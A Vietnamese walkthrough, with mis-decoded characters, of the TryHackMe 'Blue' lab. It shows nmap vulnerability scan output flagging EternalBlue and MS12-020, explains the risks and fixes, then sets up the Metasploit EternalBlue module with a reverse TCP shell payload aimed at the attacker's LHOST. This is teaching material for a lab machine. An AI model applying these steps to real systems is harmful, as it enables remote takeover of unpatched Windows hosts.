# Blue

## Má»¥c lá»¥c

1. [Task 1: Recon](#task-1-recon)
2. [Task 2: Gain Access](#task-2-gain-access)

## Ná»™i dung

# Task 1: Recon

Nháº¥n nÃºt **Start Machine** bÃªn dÆ°á»›i.

Báº¯t Ä‘áº§u AttackBox báº±ng cÃ¡ch nháº¥n nÃºt **Start AttackBox** á»Ÿ Ä‘áº§u trang. MÃ¡y AttackBox sáº½ khá»Ÿi Ä‘á»™ng á»Ÿ cháº¿ Ä‘á»™ chia Ä‘Ã´i mÃ n hÃ¬nh (Split-Screen). Náº¿u khÃ´ng tháº¥y, hÃ£y sá»­ dá»¥ng nÃºt **Show Split View** mÃ u xanh á»Ÿ Ä‘áº§u trang.

QuÃ©t vÃ  tÃ¬m hiá»ƒu xem mÃ¡y nÃ y dá»… bá»‹ khai thÃ¡c lá»— há»•ng nÃ o. LÆ°u Ã½ ráº±ng mÃ¡y nÃ y khÃ´ng pháº£n há»“i ping (ICMP) vÃ  cÃ³ thá»ƒ máº¥t vÃ i phÃºt Ä‘á»ƒ khá»Ÿi Ä‘á»™ng. **PhÃ²ng nÃ y khÃ´ng nháº±m má»¥c Ä‘Ã­ch trá»Ÿ thÃ nh má»™t thá»­ thÃ¡ch boot2root CTF, mÃ  Ä‘Ã¢y lÃ  má»™t chuá»—i hÆ°á»›ng dáº«n dÃ nh cho ngÆ°á»i má»›i báº¯t Ä‘áº§u. CÃ¡c chuyÃªn gia cÃ³ thá»ƒ sáº½ khÃ´ng thu Ä‘Æ°á»£c nhiá»u giÃ¡ trá»‹ ngoÃ i viá»‡c luyá»‡n táº­p cÆ¡ báº£n vÃ¬ quÃ¡ trÃ¬nh á»Ÿ Ä‘Ã¢y Ä‘Æ°á»£c thiáº¿t káº¿ táº­p trung cho ngÆ°á»i má»›i.**

>PhÃ²ng thá»© 2 sau phÃ²ng nÃ y [Táº¡i Ä‘Ã¢y](https://tryhackme.com/room/ice)
>PhÃ²ng tiáº¿p theo [Táº¡i Ä‘Ã¢y](https://tryhackme.com/room/blaster)


## Scan mÃ¡y

```bash
nmap -sV -vv --script vuln 10.10.138.208
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-15 08:00 BST
NSE: Loaded 149 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 10.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:00
Completed NSE at 08:00, 0.00s elapsed
Initiating ARP Ping Scan at 08:00
Scanning 10.10.138.208 [1 port]
Completed ARP Ping Scan at 08:00, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:00
Completed Parallel DNS resolution of 1 host. at 08:00, 0.00s elapsed
Initiating SYN Stealth Scan at 08:00
Scanning ip-10-10-138-208.eu-west-1.compute.internal (10.10.138.208) [1000 ports]
Discovered open port 3389/tcp on 10.10.138.208
Discovered open port 49159/tcp on 10.10.138.208
Increasing send delay for 10.10.138.208 from 0 to 5 due to 71 out of 236 dropped probes since last increase.
Discovered open port 445/tcp on 10.10.138.208
Discovered open port 139/tcp on 10.10.138.208
Discovered open port 135/tcp on 10.10.138.208
Discovered open port 49154/tcp on 10.10.138.208
Discovered open port 49152/tcp on 10.10.138.208
Discovered open port 49153/tcp on 10.10.138.208
Discovered open port 49158/tcp on 10.10.138.208
Completed SYN Stealth Scan at 08:00, 5.03s elapsed (1000 total ports)
Initiating Service scan at 08:00
Scanning 9 services on ip-10-10-138-208.eu-west-1.compute.internal (10.10.138.208)
Service scan Timing: About 55.56% done; ETC: 08:02 (0:00:43 remaining)
Completed Service scan at 08:01, 58.56s elapsed (9 services on 1 host)
NSE: Script scanning 10.10.138.208.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:01
NSE Timing: About 99.91% done; ETC: 08:02 (0:00:00 remaining)
Completed NSE at 08:02, 32.81s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:02
NSE: [ssl-ccs-injection 10.10.138.208:3389] No response from server: ERROR
Completed NSE at 08:02, 30.16s elapsed
Nmap scan report for ip-10-10-138-208.eu-west-1.compute.internal (10.10.138.208)
Host is up, received arp-response (0.00044s latency).
Scanned at 2025-08-15 08:00:31 BST for 127s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp   open  microsoft-ds syn-ack ttl 128 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
3389/tcp  open  tcpwrapped   syn-ack ttl 128
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49153/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49154/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49158/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
49159/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
MAC Address: 02:80:86:82:74:91 (Unknown)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 08:02
Completed NSE at 08:02, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 08:02
Completed NSE at 08:02, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.56 seconds
           Raw packets sent: 1077 (47.372KB) | Rcvd: 1004 (40.196KB)
```

---

### Giáº£i thÃ­ch lá»‡nh

```
nmap -sV -vv --script vuln 10.10.138.208
```

* `-sV`: dÃ² phiÃªn báº£n dá»‹ch vá»¥ Ä‘ang cháº¡y trÃªn cÃ¡c cá»•ng má»Ÿ.
* `-vv`: tÄƒng má»©c â€œverboseâ€ (in nhiá»u thÃ´ng tin hÆ¡n).
* `--script vuln`: cháº¡y bá»™ NSE scripts thuá»™c nhÃ³m `vuln` Ä‘á»ƒ kiá»ƒm tra lá»— há»•ng phá»• biáº¿n trÃªn cÃ¡c dá»‹ch vá»¥ phÃ¡t hiá»‡n Ä‘Æ°á»£c.
  â†’ Má»¥c tiÃªu: tÃ¬m cá»•ng má»Ÿ, dá»‹ch vá»¥/phiÃªn báº£n, vÃ  quick-check cÃ¡c lá»— há»•ng Ä‘Ã£ biáº¿t.

---

### CÃ¡c pha quÃ©t vÃ  dÃ²ng log quan trá»ng

**NSE: Loaded 149 scriptsâ€¦ / Script Pre-scanning / runlevel 1,2**
Nmap Scripting Engine (NSE) cÃ³ 3 giai Ä‘oáº¡n: *prerule â†’ hostrule â†’ postrule*. Báº¡n tháº¥y â€œPre-scanningâ€ vÃ  sau Ä‘Ã³ â€œScript scanning â€¦ runlevel 1/2â€ lÃ  nhá»¯ng láº§n NSE cháº¡y cÃ¡c rule trÆ°á»›c/sau khi quÃ©t cá»•ng.

**ARP Ping Scan / Host is up, received arp-response (0.00044s latency)**
Nmap dÃ¹ng ARP Ä‘á»ƒ phÃ¡t hiá»‡n host trÃªn cÃ¹ng broadcast domain. Tháº¥y ARP reply ráº¥t nhanh â‡’ host â€œUpâ€ vÃ  náº±m cÃ¹ng táº§ng 2 (hoáº·c trong má»™t lab/network áº£o cho phÃ©p ARP). TÃªn host Ä‘áº£o ngÆ°á»£c `ip-10-10-...eu-west-1.compute.internal` gá»£i Ã½ mÃ´i trÆ°á»ng cloud/lab (ráº¥t giá»‘ng TryHackMe/HTB).

**Initiating SYN Stealth Scan â€¦ Discovered open port â€¦**
Nmap dÃ¹ng â€œSYN stealthâ€ (tÆ°Æ¡ng Ä‘Æ°Æ¡ng `-sS`) Ä‘á»ƒ quÃ©t 1000 cá»•ng máº·c Ä‘á»‹nh. NÃ³ tÃ¬m tháº¥y 9 cá»•ng má»Ÿ:

* 135, 139, 445, 3389, 49152, 49153, 49154, 49158, 49159
  â€œNot shown: 991 closed ports (Reason: resets)â€ nghÄ©a lÃ  991 cá»•ng cÃ²n láº¡i pháº£n há»“i RST â‡’ Ä‘Ã³ng.

**Increasing send delay â€¦ dropped probes**
CÃ³ rá»›t gÃ³i/kÃ¬m tá»‘c Ä‘á»™ (throttle) tá»« máº¡ng/host, Nmap giáº£m tá»‘c Ä‘á»ƒ á»•n Ä‘á»‹nh káº¿t quáº£.

**Service scan**
Sau khi tháº¥y cá»•ng má»Ÿ, `-sV` cá»‘ gáº¯ng banner-grab/fingerprint Ä‘á»ƒ Ä‘oÃ¡n dá»‹ch vá»¥/phiÃªn báº£n.

---

### Káº¿t quáº£ cá»•ng & dá»‹ch vá»¥ (diá»…n giáº£i tá»«ng dÃ²ng)

| Cá»•ng                | Tráº¡ng thÃ¡i | Dá»‹ch vá»¥ (Nmap Ä‘oÃ¡n)                        | Ã nghÄ©a thá»±c táº¿                                                                                                                                                                                    |
| ------------------- | ---------- | ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **135/tcp**         | open       | **msrpc** (RPC Endpoint Mapper)            | Dá»‹ch vá»¥ RPC lÃµi cá»§a Windows.                                                                                                                                                                       |
| **139/tcp**         | open       | **netbios-ssn**                            | Legacy NetBIOS Session (SMB kiá»ƒu cÅ©).                                                                                                                                                              |
| **445/tcp**         | open       | **microsoft-ds** (Windows 7-10, WORKGROUP) | SMB (file sharing). CÃ³ SMBv1 thÃ¬ dá»… dÃ­nh MS17-010.                                                                                                                                                 |
| **3389/tcp**        | open       | **tcpwrapped**                             | ÄÃ¢y lÃ  RDP (Remote Desktop). â€œtcpwrappedâ€ nghÄ©a lÃ  Nmap khÃ´ng cáº§m náº¯m banner, káº¿t ná»‘i bá»‹ Ä‘Ã³ng ngay hoáº·c Ä‘Æ°á»£c bá»c qua TCP wrappers/firewallâ€”nhÆ°ng script RDP váº«n tÆ°Æ¡ng tÃ¡c Ä‘Æ°á»£c (xem pháº§n lá»— há»•ng). |
| **49152â€“49159/tcp** | open       | **msrpc**                                  | CÃ¡c cá»•ng Ä‘á»™ng cá»§a RPC (Dynamic RPC high ports) â€” ráº¥t bÃ¬nh thÆ°á»ng trÃªn Windows Vista/7/8/10.                                                                                                        |

**TTL 128** trÃªn cÃ¡c dÃ²ng `syn-ack ttl 128` lÃ  Ä‘áº·c trÆ°ng Windows.
**Service Info: Host: JON-PC; OS: Windows; WORKGROUP** â‡’ hostname â€œJON-PCâ€, mÃ¡y Windows trong workgroup máº·c Ä‘á»‹nh.

---

## Káº¿t quáº£ cÃ¡c script lá»— há»•ng (NSE)

### RDP â€“ cá»•ng 3389

```
rdp-vuln-ms12-020:
  VULNERABLE: CVE-2012-0152 (DoS) â€“ Medium
  VULNERABLE: CVE-2012-0002 (RCE) â€“ High
```

* Hai lá»— há»•ng ráº¥t cÅ© (MS12-020). Náº¿u Ä‘Ãºng, RDP cÃ³ thá»ƒ DoS hoáº·c tháº­m chÃ­ RCE trÆ°á»›c khi Ä‘Äƒng nháº­p (tÃ¹y cáº¥u hÃ¬nh/NLA).
* **LÆ°u Ã½:** Script-based detection cÃ³ thá»ƒ *false positive*. Cáº§n xÃ¡c nháº­n thÃªm (xem má»¥c â€œXÃ¡c minh/viá»‡c nÃªn lÃ mâ€).

Báº¡n cÅ©ng tháº¥y:

```
ssl-ccs-injection: No reply (TIMEOUT)
sslv2-drown: (trá»‘ng)
```

ÄÃ¢y lÃ  cÃ¡c script SSL/TLS chung, khÃ´ng háº³n Ã¡p cho RDP (RDP cÃ³ thá»ƒ dÃ¹ng TLS nhÆ°ng cÆ¡ cháº¿ riÃªng). TIMEOUT/khÃ´ng pháº£n há»“i â‰  lá»— há»•ng.

### SMB â€“ cá»•ng 445

```
smb-vuln-ms17-010: VULNERABLE (CVE-2017-0143)
```

* ÄÃ¢y lÃ  lá»— há»•ng **EternalBlue** ná»•i tiáº¿ng (WannaCry). Náº¿u Ä‘Ãºng lÃ  **SMBv1 cÃ²n báº­t vÃ  chÆ°a vÃ¡**, rá»§i ro **RCE** ráº¥t cao.
* CÃ¡c script khÃ¡c:

  * `smb-vuln-ms10-054: false` â‡’ Ä‘Ã£ vÃ¡ hoáº·c khÃ´ng bá»‹.
  * `smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED` â‡’ cáº§n quyá»n/khÃ´ng kiá»ƒm tra Ä‘Æ°á»£c.
  * `samba-vuln-cve-2012-1182: ACCESS_DENIED` â‡’ script cho **Samba** (Linux) chá»© khÃ´ng pháº£i Windows; bÃ¡o â€œACCESS\_DENIEDâ€ nÃªn bá» qua.

### CÃ¡c dÃ²ng lá»—i khÃ¡c

```
clamav-exec: ERROR: Script execution failed
```

Script nÃ y thá»­ test ClamAV (cá»•ng 3310) nhÆ°ng báº¡n khÃ´ng cÃ³ dá»‹ch vá»¥ Ä‘Ã³ â†’ lá»—i lÃ  **bÃ¬nh thÆ°á»ng** khi script â€œvulnâ€ cá»‘ chá»c dá»‹ch vá»¥ khÃ´ng tá»“n táº¡i/tá»« chá»‘i.

---

### Tá»•ng há»£p nhanh

* **MÃ¡y Windows** (JON-PC), Ä‘á»ƒ lá»™ **RDP (3389)** vÃ  **SMB (445)** ra máº¡ng.
* NSE bÃ¡o **cÃ³ thá»ƒ** dÃ­nh:

  * **MS12-020 (RDP)** â€“ DoS/RCE (CVE-2012-0152, CVE-2012-0002).
  * **MS17-010 (SMBv1)** â€“ RCE nghiÃªm trá»ng (CVE-2017-0143 / EternalBlue).
* 135/139/445/3389 + dáº£i 4915x lÃ  *chÃ¢n dung Ä‘iá»ƒn hÃ¬nh* cá»§a mÃ¡y Windows cÅ©/chÆ°a vÃ¡ trong mÃ´i trÆ°á»ng lab.

> **Cáº£nh bÃ¡o vá» Ä‘á»™ tin cáº­y:** Káº¿t quáº£ tá»« scripts NSE lÃ  â€œbest effortâ€. CÃ³ thá»ƒ **false positive/false negative** do tÆ°á»ng lá»­a, IDS/IPS, phiÃªn báº£n Nmap cÅ© (7.80). NÃªn xÃ¡c minh láº¡i báº±ng cÃ¡c kiá»ƒm tra **khÃ´ng xÃ¢m nháº­p** khÃ¡c.

---
## QuÃ©t sá»‘ cá»•ng Ä‘ang má»Ÿ

CÃ³ bao nhiÃªu cá»•ng Ä‘ang má»Ÿ vá»›i sá»‘ cá»•ng nhá» hÆ¡n 1000?

ChÃºng tÃ´i Ä‘Ã£ dÃ¹ng lá»‡nh:

```
nmap -Pn -p- -sS -sV -sC -O -oN namp.test -A --script vuln $IP
```

`$IP` lÃ  Ä‘á»‹a chá»‰ IP cá»§a mÃ¡y chÃºng ta.

1. **-Pn**: Bá» qua bÆ°á»›c dÃ² tÃ¬m host (giáº£ Ä‘á»‹nh táº¥t cáº£ host Ä‘á»u online).
2. **-p-**: QuÃ©t táº¥t cáº£ cÃ¡c cá»•ng (1â€“65535).
3. **-sS**: Thá»±c hiá»‡n quÃ©t SYN (cÃ²n gá»i lÃ  quÃ©t ná»­a má»Ÿ â€“ half-open scan).
4. **-sV**: Kiá»ƒm tra cÃ¡c cá»•ng má»Ÿ Ä‘á»ƒ xÃ¡c Ä‘á»‹nh thÃ´ng tin dá»‹ch vá»¥/phiÃªn báº£n.
5. **-sC**: Cháº¡y cÃ¡c script NSE máº·c Ä‘á»‹nh.
6. **-O**: Báº­t phÃ¡t hiá»‡n há»‡ Ä‘iá»u hÃ nh.
7. **-oN `<output_file>`**: LÆ°u káº¿t quáº£ vÃ o file chá»‰ Ä‘á»‹nh.
8. **-T5**: Thiáº¿t láº­p cháº¿ Ä‘á»™ quÃ©t nhanh nháº¥t (aggressive timing).
9. **-A**: Báº­t phÃ¡t hiá»‡n há»‡ Ä‘iá»u hÃ nh, phÃ¡t hiá»‡n phiÃªn báº£n, quÃ©t script, vÃ  traceroute.
10. **--script vuln**: Cháº¡y cÃ¡c script phÃ¡t hiá»‡n lá»— há»•ng báº£o máº­t.

```bash
nmap -p 1-1000 10.10.138.208
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-15 08:41 BST
Nmap scan report for ip-10-10-138-208.eu-west-1.compute.internal (10.10.138.208)
Host is up (0.00037s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 02:80:86:82:74:91 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.71 seconds
```

---

## Xem cÃ¡c lá»— há»•ng

### **1. MS17-010 â€“ SMBv1 Remote Code Execution**

* **Cá»•ng liÃªn quan:** `445/tcp` (Microsoft SMB)
* **CVE:** [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
* **Má»©c Ä‘á»™ rá»§i ro:** **Cao** â€“ ÄÃ¢y chÃ­nh lÃ  lá»— há»•ng â€œEternalBlueâ€ Ä‘Æ°á»£c sá»­ dá»¥ng trong vá»¥ táº¥n cÃ´ng **WannaCry**.
* **TÃ¡c háº¡i:**

  * Cho phÃ©p káº» táº¥n cÃ´ng tá»« xa thá»±c thi mÃ£ Ä‘á»™c **mÃ  khÃ´ng cáº§n Ä‘Äƒng nháº­p**.
  * CÃ³ thá»ƒ chiáº¿m toÃ n quyá»n Ä‘iá»u khiá»ƒn há»‡ thá»‘ng.
* **NguyÃªn nhÃ¢n:** SMBv1 váº«n Ä‘ang báº­t vÃ  chÆ°a Ä‘Æ°á»£c vÃ¡.
* **CÃ¡ch kháº¯c phá»¥c:** Táº¯t SMBv1, cÃ i báº£n vÃ¡ báº£o máº­t cá»§a Microsoft phÃ¡t hÃ nh thÃ¡ng 3/2017.

---

### **2. MS12-020 â€“ Lá»— há»•ng trong Remote Desktop Protocol (RDP)**

* **Cá»•ng liÃªn quan:** `3389/tcp` (RDP)
* **CVE:**

  * [CVE-2012-0152](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152) â€“ Táº¥n cÃ´ng Tá»« chá»‘i dá»‹ch vá»¥ (DoS)
  * [CVE-2012-0002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002) â€“ Thá»±c thi mÃ£ tá»« xa (**nguy cÆ¡ cao**)
* **TÃ¡c háº¡i:**

  * **CVE-2012-0002**: Cho phÃ©p thá»±c thi mÃ£ Ä‘á»™c trÆ°á»›c khi Ä‘Äƒng nháº­p vÃ o RDP.
  * **CVE-2012-0152**: CÃ³ thá»ƒ lÃ m treo dá»‹ch vá»¥ RDP.
* **NguyÃªn nhÃ¢n:** ChÆ°a cÃ i báº£n vÃ¡ vÃ  cÃ³ thá»ƒ chÆ°a báº­t Network Level Authentication (NLA).
* **CÃ¡ch kháº¯c phá»¥c:** CÃ i báº£n vÃ¡ MS12-020, báº­t NLA vÃ  giá»›i háº¡n truy cáº­p RDP qua tÆ°á»ng lá»­a hoáº·c VPN.

---

### **Báº£ng tÃ³m táº¯t**

| Cá»•ng | Dá»‹ch vá»¥ | Lá»— há»•ng                             | CVE                          | Má»©c rá»§i ro           |
| ---- | ------- | ----------------------------------- | ---------------------------- | -------------------- |
| 445  | SMBv1   | Remote Code Execution (EternalBlue) | CVE-2017-0143                | **Cao**              |
| 3389 | RDP     | RCE & DoS                           | CVE-2012-0002, CVE-2012-0152 | **Cao / Trung bÃ¬nh** |

---

## **VÃ¬ sao nguy hiá»ƒm**

Cáº£ hai lá»— há»•ng nÃ y Ä‘á»u cÃ³ thá»ƒ bá»‹ khai thÃ¡c **tá»« xa, khÃ´ng cáº§n xÃ¡c thá»±c**.
Náº¿u mÃ¡y nÃ y lá»™ ra internet hoáº·c máº¡ng LAN khÃ´ng an toÃ n, káº» táº¥n cÃ´ng cÃ³ thá»ƒ:

* Chiáº¿m toÃ n quyá»n há»‡ thá»‘ng (MS17-010, CVE-2012-0002).
* CÃ i ransomware hoáº·c worm Ä‘á»ƒ lÃ¢y sang cÃ¡c mÃ¡y khÃ¡c.
* DÃ¹ng lÃ m bÃ n Ä‘áº¡p táº¥n cÃ´ng sÃ¢u hÆ¡n vÃ o máº¡ng ná»™i bá»™.

---

# Task 2: Gain Access

## Khá»Ÿi Ä‘á»™ng Metasploit

![](./img/5_Blue/2.1.png)

## TÃ¬m Ä‘Æ°á»ng dáº«n Ä‘áº¿n mÃ£ khai thÃ¡c

TÃ¬m mÃ£ khai thÃ¡c mÃ  chÃºng ta sáº½ cháº¡y trÃªn mÃ¡y. ÄÆ°á»ng dáº«n Ä‘áº§y Ä‘á»§ cá»§a mÃ£ lÃ  gÃ¬? (VÃ­ dá»¥: exploit/........)

![](./img/5_Blue/2.2.png)


```bash
search ms17_010
```

vÃ  Metasploit Ä‘Ã£ tráº£ vá» danh sÃ¡ch **cÃ¡c module liÃªn quan Ä‘áº¿n lá»— há»•ng MS17-010** (EternalBlue, EternalRomance, EternalSynergyâ€¦).

 1. Ã nghÄ©a báº£ng káº¿t quáº£

* **#** â†’ sá»‘ thá»© tá»± Ä‘á»ƒ tham chiáº¿u nhanh (cÃ³ thá»ƒ gá»i module báº±ng sá»‘ nÃ y).
* **Name** â†’ Ä‘Æ°á»ng dáº«n vÃ  tÃªn module trong Metasploit.
  VÃ­ dá»¥: `exploit/windows/smb/ms17_010_eternalblue`
* **Disclosure Date** â†’ ngÃ y cÃ´ng bá»‘ lá»— há»•ng (14/03/2017).
* **Rank** â†’ Ä‘á»™ tin cáº­y/hiá»‡u quáº£ cá»§a module (`average`, `normal`â€¦).
* **Check** â†’ cho biáº¿t module cÃ³ há»— trá»£ lá»‡nh `check` Ä‘á»ƒ kiá»ƒm tra lá»— há»•ng hay khÃ´ng.
* **Description** â†’ mÃ´ táº£ ngáº¯n gá»n module khai thÃ¡c hoáº·c quÃ©t.

---

2. CÃ¡c nhÃ³m module chÃ­nh trong káº¿t quáº£

ğŸ”¹ **Exploit Modules** (táº¥n cÃ´ng, chiáº¿m quyá»n)

* **exploit/windows/smb/ms17\_010\_eternalblue**
  â†’ Khai thÃ¡c EternalBlue (SMBv1) â†’ RCE (Remote Code Execution)
  CÃ³ nhiá»u **target** bÃªn dÆ°á»›i (Windows 7, 8, 10, Server 2012â€¦).

* **exploit/windows/smb/ms17\_010\_psexec**
  â†’ Káº¿t há»£p EternalRomance/EternalSynergy/EternalChampion vá»›i cÆ¡ cháº¿ `psexec` Ä‘á»ƒ thá»±c thi lá»‡nh tá»« xa.

ğŸ”¹ **Admin/Command Modules**

* **auxiliary/admin/smb/ms17\_010\_command**
  â†’ Cho phÃ©p thá»±c thi lá»‡nh qua SMB náº¿u khai thÃ¡c thÃ nh cÃ´ng.

ğŸ”¹ **Scanner Modules** (quÃ©t, phÃ¡t hiá»‡n)

* **auxiliary/scanner/smb/smb\_ms17\_010**
  â†’ DÃ¹ng Ä‘á»ƒ kiá»ƒm tra host cÃ³ dÃ­nh MS17-010 hay khÃ´ng (khÃ´ng khai thÃ¡c, chá»‰ phÃ¡t hiá»‡n).

---

## Äáº·t cÃ¡c giÃ¡ trá»‹

Hiá»ƒn thá»‹ cÃ¡c tÃ¹y chá»n vÃ  Ä‘áº·t giÃ¡ trá»‹ báº¯t buá»™c. TÃªn cá»§a giÃ¡ trá»‹ nÃ y lÃ  gÃ¬? (Viáº¿t hoa toÃ n bá»™ khi ná»™p)

- Äáº§u tiÃªn chÃºng ta cáº§n chá»n module báº±ng sá»‘

`use 0`

ChÃºng ta cÃ³ thá»ƒ chá»n báº±ng Ä‘Æ°á»ng dáº«n, tuy nhiÃªn module ms17_010_eternalblue náº±m á»Ÿ sá»‘ 0 nÃªn cÃ³ thá»ƒ sá»­ dá»¥ng `use 0`

![](./img/5_Blue/2.3.png)

- Tiáº¿p theo cáº§n kiá»ƒm tra lá»— há»•ng

![](./img/5_Blue/2.4.png)


1. Module options

```
RHOSTS        yes   The target host(s)
RPORT   445   yes   The target port (TCP)
SMBDomain     no    TÃªn miá»n Windows (náº¿u cáº§n Ä‘Äƒng nháº­p)
SMBPass       no    Máº­t kháº©u (náº¿u cáº§n)
SMBUser       no    TÃ i khoáº£n (náº¿u cáº§n)
VERIFY_ARCH   yes   Kiá»ƒm tra kiáº¿n trÃºc (32/64-bit) trÆ°á»›c khi exploit
VERIFY_TARGET yes   Kiá»ƒm tra OS cÃ³ khá»›p vá»›i exploit hay khÃ´ng
```

á» Ä‘Ã¢y, cÃ¡i **báº¯t buá»™c báº¡n pháº£i set lÃ  RHOSTS** (IP cá»§a mÃ¡y náº¡n nhÃ¢n).

* `RPORT` máº·c Ä‘á»‹nh = 445 (cá»•ng SMB), giá»¯ nguyÃªn.
* `SMBDomain`, `SMBUser`, `SMBPass` thÆ°á»ng Ä‘á»ƒ trá»‘ng (chá»‰ cáº§n khi cáº§n xÃ¡c thá»±c).
* `VERIFY_ARCH` vÃ  `VERIFY_TARGET` máº·c Ä‘á»‹nh lÃ  `true`, cÃ³ lá»£i cho Ä‘á»™ á»•n Ä‘á»‹nh, nÃªn giá»¯ nguyÃªn.


---

2. Payload options (windows/x64/meterpreter/reverse\_tcp)

```
EXITFUNC   thread   yes   CÃ¡ch thoÃ¡t khi payload káº¿t thÃºc
LHOST      ?        yes   Äá»‹a chá»‰ IP mÃ¡y táº¥n cÃ´ng (attacker)
LPORT      4444     yes   Cá»•ng láº¯ng nghe
```

Báº¯t buá»™c pháº£i set **LHOST** (IP cá»§a mÃ¡y táº¥n cÃ´ng â€“ mÃ¡y báº¡n).

---

![](./img/5_Blue/2.5.png)


- Sau Ä‘Ã³:

```bash
set payload windows/x64/shell/reverse_tcp
```


Trong Metasploit, **payload** lÃ  Ä‘oáº¡n mÃ£ cháº¡y trÃªn mÃ¡y náº¡n nhÃ¢n sau khi khai thÃ¡c lá»— há»•ng thÃ nh cÃ´ng.
NÃ³ quyáº¿t Ä‘á»‹nh báº¡n sáº½ cÃ³ **quyá»n kiá»ƒm soÃ¡t** kiá»ƒu gÃ¬.

 `windows/x64/shell/reverse_tcp`

* **windows** â†’ payload dÃ nh cho há»‡ Ä‘iá»u hÃ nh Windows.
* **x64** â†’ kiáº¿n trÃºc 64-bit (cháº¡y trÃªn Windows 7/8/10/Server 64-bit).
* **shell** â†’ kiá»ƒu káº¿t ná»‘i tráº£ vá» lÃ  má»™t **command shell cÆ¡ báº£n** (`cmd.exe`).
* **reverse\_tcp** â†’ nghÄ©a lÃ :

  * MÃ¡y náº¡n nhÃ¢n **chá»§ Ä‘á»™ng káº¿t ná»‘i ngÆ°á»£c** vá» mÃ¡y táº¥n cÃ´ng.
  * MÃ¡y attacker (báº¡n) cáº§n láº¯ng nghe táº¡i **LHOST\:LPORT**.
  * Sau khi káº¿t ná»‘i thÃ nh cÃ´ng, báº¡n sáº½ cÃ³ má»™t cá»­a sá»• lá»‡nh (shell) Ä‘á»ƒ gÃµ lá»‡nh trá»±c tiáº¿p trÃªn mÃ¡y náº¡n nhÃ¢n.

---


